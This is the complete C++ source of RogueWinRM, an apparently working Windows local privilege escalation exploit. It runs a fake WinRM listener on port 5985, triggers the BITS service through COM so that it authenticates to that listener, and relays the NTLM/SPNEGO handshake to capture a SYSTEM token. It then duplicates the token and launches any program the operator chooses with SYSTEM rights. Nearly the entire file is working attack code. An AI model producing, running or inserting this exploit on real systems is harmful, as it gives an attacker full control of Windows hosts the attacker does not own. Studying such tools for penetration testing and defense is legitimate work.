#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <atlbase.h>
#include "LocalNegotiator.h"
#include "base64.h"
#include "spnegotokenhandler/spnego.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

struct THREAD_PARAMETERS
{
	wchar_t* listen_port;
	LocalNegotiator* negotiator;
	bool debug;
};

typedef unsigned char byte;
int RunRogueWinRM(wchar_t* processname, wchar_t* listen_port, wchar_t* processargs, bool debug);
void hexDump2(char* desc, void* addr, int len);
int findBase64Negotiate(char* buffer, int buffer_len, byte* outbuffer, int* outbuffer_len);
bool parseNegToken(unsigned char* token, int tokenSize, unsigned char** parsedToken, unsigned long* parsedTokenLen);
bool genNegTokenTarg(unsigned char* ntlmssp, int ntlmssp_len, unsigned char** generatedToken, unsigned long* generatedTokenLen);
int processNtlmBytes(char* bytes, int len, LocalNegotiator* negotiator);
BOOL EnablePriv(HANDLE hToken, LPCTSTR priv);
int IsTokenSystem(HANDLE tok);
void SocketError(SOCKET);
bool isBitsRunning(void);
bool triggerBits(void);
HANDLE startListenerThread(wchar_t* listen_port, LocalNegotiator* negotiator, bool debug);
void startListener(LPVOID threadParameters);

void usage()
{
	printf("\nRogueWinRM \n\n");

	printf("Mandatory args: \n"
		"-p <program>: program to launch\n"
	);
	printf("\nOptional args: \n"
		"-a <argument>: command line argument to pass to program (default NULL)\n"
		"-l <port>: listening port (default 5985 WinRM)\n"
		"-d : Enable Debugging output\n"
	);
}

int wmain(int argc, wchar_t** argv)
{
	wchar_t* processargs = NULL;
	wchar_t* processname = NULL;
	wchar_t* listen_port = NULL;
	wchar_t default_listen_port[] = L"5985";
	bool debug = false;
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
			case 'p':
				++argv;
				--argc;
				processname = argv[1];
				break;
			case 'a':
				++argv;
				--argc;
				processargs = argv[1];
				break;
			case 'l':
				++argv;
				--argc;
				listen_port = argv[1];
				break;
			case 'd':
				++argv;
				--argc;
				debug = true;
				break;
			default:
				printf("Wrong Argument: %s\n", argv[1]);
				usage();
				exit(-1);
		}
		++argv;
		--argc;
	}
	if (processname == NULL) {
		usage();
		exit(-1);
	}

	// Default WinRM port
	if (listen_port == NULL) 
		listen_port = default_listen_port;

	exit(RunRogueWinRM(processname, listen_port, processargs, debug));
	return 0;
}

int RunRogueWinRM(wchar_t* processname, wchar_t* listen_port, wchar_t *processargs, bool debug) {
	LocalNegotiator* negotiator = new LocalNegotiator();
	bool bitsRunning = true;
	bool triggerBitsStatus = false;
	HANDLE hThread = startListenerThread(listen_port, negotiator, debug);
	Sleep(1000);
	do {
		bitsRunning = isBitsRunning();
		if (bitsRunning) 
			Sleep(30000);
	} while (bitsRunning);
	triggerBitsStatus = triggerBits();
	if (!triggerBitsStatus) {
		printf("\nCannot activate BITS object. Exiting...\n");
		exit(-1);
	}
	else
		printf("\nBITS triggered!\n");
	
	BOOL result = false;
	int ret = 0;
	HANDLE elevated_token, duped_token;

	if (negotiator->authResult != -1)
	{
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		SECURITY_DESCRIPTOR sdSecurityDescriptor;
		printf("\n[+] authresult %d\n", negotiator->authResult);

		fflush(stdout);

		// Get a token for this process. 
		if (!OpenProcessToken(GetCurrentProcess(),
			TOKEN_ALL_ACCESS, &hToken))return 0;

		//enable privileges
		EnablePriv(hToken, SE_IMPERSONATE_NAME);
		EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
		PTOKEN_TYPE ptg;
		DWORD dwl = 0;
		HANDLE hProcessToken;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
			&hProcessToken);

		QuerySecurityContextToken(negotiator->phContext, &elevated_token);
		IsTokenSystem(elevated_token);

		GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
		if (!dwl)
			printf("[-] Error getting token type: error code 0x%lx\n", GetLastError());

		result = DuplicateTokenEx(elevated_token,
			TOKEN_ALL_ACCESS,
			NULL,
			SecurityImpersonation,
			TokenPrimary,
			&duped_token);


		GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
		if (!dwl)
			printf("Error getting token type: error code 0x%lx\n", GetLastError());

		DWORD SessionId;
		PROCESS_INFORMATION pi;
		STARTUPINFO si;
		SECURITY_ATTRIBUTES sa;

		ZeroMemory(&si, sizeof(STARTUPINFO));
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(STARTUPINFO);
		si.lpDesktop = (LPWSTR)L"winsta0\\default";

		DWORD sessionId = WTSGetActiveConsoleSessionId();

		fflush(stdout);
		wchar_t command[256];
		wcscpy(command, processname);

		if (processargs != NULL)
		{
			wcsncat(command, L" ", 1);
			wcsncat(command, processargs, wcslen(processargs));
		}

		//could be also the elevated_token 
		result = CreateProcessWithTokenW(duped_token,
			0,
			processname,
			command,
			0,
			NULL,
			NULL,
			&si,
			&pi);

		if (!result)
		{
			printf("\n[-] CreateProcessWithTokenW Failed to create proc: %d\n", GetLastError());
		}
		else
		{
			printf("\n[+] CreateProcessWithTokenW OK\n");
			return 0;
		}


		result = CreateProcessAsUserW(
			duped_token,
			processname,
			command,
			nullptr, nullptr,
			FALSE, 0, nullptr,
			L"C:\\", &si, &pi
		);

		if (!result) {
			printf("\n[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
			return -1;
		}
		else {
			printf("\n[+] CreateProcessAsUser OK\n");
		}

	}
	else
		printf("\nError: No Authenticaton received... negotiator->authResult != -1\n");
	CloseHandle(hThread);
	return 0;
}

void SocketError(SOCKET Socket) {
	printf("\nSocket error.. WSAGetLastError: %d\n", WSAGetLastError());
	shutdown(Socket, SD_SEND);
	WSACleanup();
	exit(-1);
}

void startListener(LPVOID threadParameters) {
	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)threadParameters;
	wchar_t* listen_port = thread_params->listen_port;
	LocalNegotiator* negotiator = thread_params->negotiator;
	bool debug = thread_params->debug;
	WSADATA wsaData;
	int iResult;
	char listen_port_a[12];
	const int DEFAULT_BUFLEN = 4096;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo* result = NULL;
	struct addrinfo hints;

	int iSendResult;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(-1);
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(listen_port_a, 0, 12);
	wcstombs(listen_port_a, listen_port, 12);

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, listen_port_a, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		exit(-1);
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(-1);
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		if (wcscmp(listen_port, L"5985") == 0) {
			printf("Error: WinRM already running on port 5985. Unexploitable!\n");
		}
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}

	// Accept a client socket
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}

	// No longer need server socket
	closesocket(ListenSocket);

	//variables for handling ntlm authentication over http
	byte base64_spnego_token[4192];
	int base64spnego_token_len = 0;
	bool spnegoResult = false;
	unsigned char* spnego_NegTokenInit_request;
	size_t spnego_NegTokenInit_request_len = 0;
	unsigned char* ntlmssp_request = NULL;
	size_t ntlmssp_request_len = 0;
	char* ntlmssp_type2;
	size_t ntlmssp_type2_b64_len = 0;
	char* ntlmssp_type2_b64;
	unsigned long ntlmssp_type2_len = 0;
	byte base64_ntlmssp_authorization[4192];
	int base64_ntlmssp_authorization_len;
	unsigned char* spnego_NegTokenTarg_response;
	size_t spnego_NegTokenTarg_response_len = 0;
	unsigned char* ntlmssp_authorization;
	size_t ntlmssp_authorization_len = 0;
	char* ntlmssp_type2_full;
	int ntlmssp_type2_full_len;
	char http_response_type2_head[] = "HTTP/1.1 401 \r\nWWW-Authenticate: Negotiate ";
	char http_response_type2_tail[] = "\r\nServer: Microsoft-HTTPAPI/2.0\r\nContent-Length: 0\r\n\r\n";
	char* http_response_type2_packet;
	int http_response_type2_packet_len;
	
	iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
	if (iResult <= 0) SocketError(ClientSocket);
	printf("\nReceived http negotiate request\n");
	if (debug) {
		printf("\nHexdump of received packet:\n");
		hexDump2(NULL, recvbuf, iResult);
	}
	//parsing the base64 of SPNEGO request
	findBase64Negotiate(recvbuf, iResult, base64_spnego_token, &base64spnego_token_len);
	//decoding the base64 of SPNEGO NegTokenInit
	spnego_NegTokenInit_request = base64_decode((const char*)base64_spnego_token, base64spnego_token_len, &spnego_NegTokenInit_request_len);
	//parsing the ntlmssp from the SPNEGO NegTokenInit token
	spnegoResult = parseNegToken(spnego_NegTokenInit_request, spnego_NegTokenInit_request_len, &ntlmssp_request, (unsigned long*)&ntlmssp_request_len);
	if (!spnegoResult) {
		shutdown(ClientSocket, SD_SEND);
		WSACleanup();
		exit(-1);
	}
	//calling AcceptSecurityContext() on the challenge request
	processNtlmBytes((char*)ntlmssp_request, ntlmssp_request_len, negotiator);
	ntlmssp_type2 = negotiator->returnType2(&ntlmssp_type2_len);
	//forging ntlmssp challenge response
	spnegoResult = genNegTokenTarg((unsigned char *)ntlmssp_type2, ntlmssp_type2_len, (unsigned char **)&ntlmssp_type2_full, (unsigned long*)&ntlmssp_type2_full_len);
	if (!spnegoResult) {
		shutdown(ClientSocket, SD_SEND);
		WSACleanup();
		exit(-1);
	}
	//encoding ntlmssp challenge response
	ntlmssp_type2_b64 = base64_encode((const unsigned char*)ntlmssp_type2_full, (size_t)ntlmssp_type2_full_len, &ntlmssp_type2_b64_len);
	//forging http response packet 401 with type 2 ntlm chellenge response
	http_response_type2_packet_len = sizeof(http_response_type2_head) + ntlmssp_type2_b64_len + sizeof(http_response_type2_tail);
	http_response_type2_packet = (char*)malloc(http_response_type2_packet_len);
	memcpy(http_response_type2_packet, http_response_type2_head, sizeof(http_response_type2_head));
	memcpy((http_response_type2_packet + sizeof(http_response_type2_head) - 1), ntlmssp_type2_b64, ntlmssp_type2_b64_len);
	memcpy((http_response_type2_packet + sizeof(http_response_type2_head) + ntlmssp_type2_b64_len - 1), http_response_type2_tail, sizeof(http_response_type2_tail));
	if (debug) {
		printf("\nHexdump of http_response_type2_packet:\n");
		hexDump2(NULL, http_response_type2_packet, http_response_type2_packet_len);
	}
	printf("\nSending the 401 http response with ntlm type 2 challenge\n");
	iResult = send(ClientSocket, http_response_type2_packet, http_response_type2_packet_len - 2, 0);
	if (iResult <= 0) SocketError(ClientSocket);
	iResult = recv(ClientSocket, recvbuf, 4096, 0);
	if (iResult <= 0) SocketError(ClientSocket);
	printf("\nReceived http packet with ntlm type3 response\n");
	if (debug) {
		printf("\nHexdump of received packet http_request_type3_packet:\n");
		hexDump2(NULL, recvbuf, iResult);
	}
	printf("\nUsing ntlm type3 response in AcceptSecurityContext()\n");
	findBase64Negotiate(recvbuf, iResult, base64_ntlmssp_authorization, &base64_ntlmssp_authorization_len);
	spnego_NegTokenTarg_response = base64_decode((const char*)base64_ntlmssp_authorization, base64_ntlmssp_authorization_len, &spnego_NegTokenTarg_response_len);
	spnegoResult = parseNegToken(spnego_NegTokenTarg_response, spnego_NegTokenTarg_response_len, &ntlmssp_authorization, (unsigned long*)&ntlmssp_authorization_len);
	processNtlmBytes((char*)ntlmssp_authorization, ntlmssp_authorization_len, negotiator);
	shutdown(ClientSocket, SD_SEND);
	WSACleanup();
}

void hexDump2(char* desc, void* addr, int len) {
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	if (len == 0) {
		printf("  ZERO LENGTH\n");
		return;
	}
	if (len < 0) {
		printf("  NEGATIVE LENGTH: %i\n", len);
		return;
	}

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
			buff[i % 16] = '.';
		else
			buff[i % 16] = pc[i];
		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}


int findBase64Negotiate(char* buffer, int buffer_len, byte* outbuffer, int* outbuffer_len) {
	char pattern_head[10] = { 'N', 'e', 'g', 'o', 't', 'i', 'a', 't', 'e', ' ' };
	char pattern_tail[2] = { 0x0D, 0x0A }; // \r\n
	int index_start = 0;
	for (int i = 0; i < buffer_len; i++) {
	}
	for (int i = 0; i < buffer_len; i++) {
		if (buffer[i] == pattern_head[index_start]) {
			index_start = index_start + 1;
			if (index_start == sizeof(pattern_head)) {
				index_start = i + 1;
				break;
			}
		}
	}
	*outbuffer_len = 0;
	for (int i = index_start; i < buffer_len; i++) {
		if (buffer[i] == pattern_tail[0] && buffer[i + 1] == pattern_tail[1]) {
			break;
		}
		outbuffer[(*outbuffer_len)] = buffer[i];
		*outbuffer_len = (*outbuffer_len) + 1;
	}
	//printf("*outbuffer_len: %d and index_start: %d", *outbuffer_len,index_start);
	//hexDump2(NULL, outbuffer, *outbuffer_len);
	return 0;
}

int processNtlmBytes(char* bytes, int len, LocalNegotiator* negotiator) {
	int messageType = bytes[8];
	switch (messageType) {
	case 1:
		//NTLM type 1 message
		negotiator->handleType1(bytes, len);
		break;
	case 3:
		//NTLM type 3 message
		negotiator->handleType3(bytes, len);
		break;
	default:
		printf("Error - Unknown NTLM message type...");
		return -1;
		break;
	}
	return 0;
}

bool parseNegToken(unsigned char* token, int tokenSize, unsigned char** parsedToken, unsigned long *parsedTokenLen) {
	SPNEGO_TOKEN_HANDLE     hSpnegoToken = NULL;
	int						nError = 0L;
	unsigned char* pbMechToken = NULL;

	if (spnegoInitFromBinary(token, tokenSize, &hSpnegoToken) != SPNEGO_E_SUCCESS){
		printf("\nCannot parse SPNEGO NegTokenInit token\n");
		return false;
	}

	nError = spnegoGetMechToken(hSpnegoToken, NULL, parsedTokenLen);
	if (SPNEGO_E_BUFFER_TOO_SMALL == nError)
	{

		// Allocate a properly sized buffer and retry.
		pbMechToken = (unsigned char*)malloc(*parsedTokenLen);

		if (spnegoGetMechToken(hSpnegoToken, pbMechToken, parsedTokenLen)!= SPNEGO_E_SUCCESS)
		{
			printf("\nCannot get MechToken content from SPNEGO NegTokenInit token\n");
			return false;
		}
	}
	*parsedToken = pbMechToken;
	return true;
}

bool genNegTokenTarg(unsigned char* ntlmssp, int ntlmssp_len, unsigned char** generatedToken, unsigned long* generatedTokenLen) {
	unsigned char* pbRespToken = NULL;
	unsigned long     ulRespTokenLen = 0L;
	int						nError = 0L;
	SPNEGO_TOKEN_HANDLE     hSpnegoResponseToken = NULL;
	SPNEGO_MECH_OID   spnegoMechOID = spnego_mech_oid_NTLMSSP;
	SPNEGO_NEGRESULT  spnegoNegResult = spnego_negresult_incomplete;
	
	// Create the Token and then extract the binary.
	if (spnegoCreateNegTokenTarg(spnegoMechOID, spnegoNegResult, ntlmssp, ntlmssp_len, NULL, 0L, &hSpnegoResponseToken) != SPNEGO_E_SUCCESS)
	{
		printf("\nCannot create SPNEGO NegTokenTarg token\n");
		return false;
	}
	if (spnegoTokenGetBinary(hSpnegoResponseToken, NULL, generatedTokenLen)== SPNEGO_E_BUFFER_TOO_SMALL)
	{
		// Now allocate and extract the buffer.
		*generatedToken = (unsigned char*)malloc(*generatedTokenLen);
		nError = spnegoTokenGetBinary(hSpnegoResponseToken, *generatedToken, generatedTokenLen);
		if (SPNEGO_E_SUCCESS == nError)
		{
			return true;
		}
		else
		{
			printf("\nCannot convert SPNEGO NegTokenTarg token to binary data\n");
			free(*generatedToken);
			*generatedToken = NULL;
			return false;
		}
	}
	printf("\nCannot convert SPNEGO NegTokenTarg token to binary data\n");
	return false;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("Priv Lookup FALSE\n");
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("Priv Adjust FALSE\n");
		return FALSE;
	}

	return TRUE;
}

int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER* User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER*)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf("%S\\%S\n", DomainName, UserName);
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 1;

	return 0;
}

bool isBitsRunning() {
	SC_HANDLE hService, hSCManager;
	SERVICE_STATUS ServiceStatus;
	int status = -1;
	bool result = false;
	hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SERVICE_QUERY_STATUS);
	if (hSCManager == NULL) {
		printf("\nSCM Error. Skipping BITS check ...\nOpenSCManagerA error: %d\n", GetLastError());
		return false;
	}
	hService = OpenServiceA(hSCManager, (LPCSTR)"BITS", SERVICE_QUERY_STATUS);
	if (hService == NULL) {
		printf("\nSCM Error. Skipping BITS check ...\nOpenServiceA error: %d\n", GetLastError());
		return false;
	}
	status = QueryServiceStatus(hService, &ServiceStatus);
	if (status == 0) {
		printf("\nSCM Error. Skipping BITS check ...\nQueryServiceStatus error: %d\n", GetLastError());
		return false;
	}
	if (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
		result = true;
		printf("BITS is running... Waiting 30 seconds for Timeout (usually 120 seconds for timeout)... \n");
	}
	else
		result = false;
	return result;
}

bool triggerBits(void) {
	bool status=false;
	HRESULT result = -1;
	CLSID clsid;
	IUnknown* unknown1 = NULL;
	CoInitialize(nullptr);
	CLSIDFromString(OLESTR("{4991d34b-80a1-4291-83b6-3328366b9097}"), &clsid);
	result = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (void**)&unknown1);
	if (result == S_OK) {
		status = true;
		unknown1->Release();
	}
	else {
		printf("CoCreateInstance failed with error 0x%x\n", result);
		status = false;
	}
	CoUninitialize();
	return status;
}

HANDLE startListenerThread(wchar_t* listen_port, LocalNegotiator* negotiator, bool debug) {
	HANDLE hThread;
	THREAD_PARAMETERS threads_params = {};
	threads_params.listen_port = listen_port;
	threads_params.negotiator = negotiator;
	threads_params.debug = debug;
	wprintf(L"\nListening for connection on port %s .... \n", listen_port);
	hThread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(startListener), &threads_params, 0, NULL);
	return hThread;
}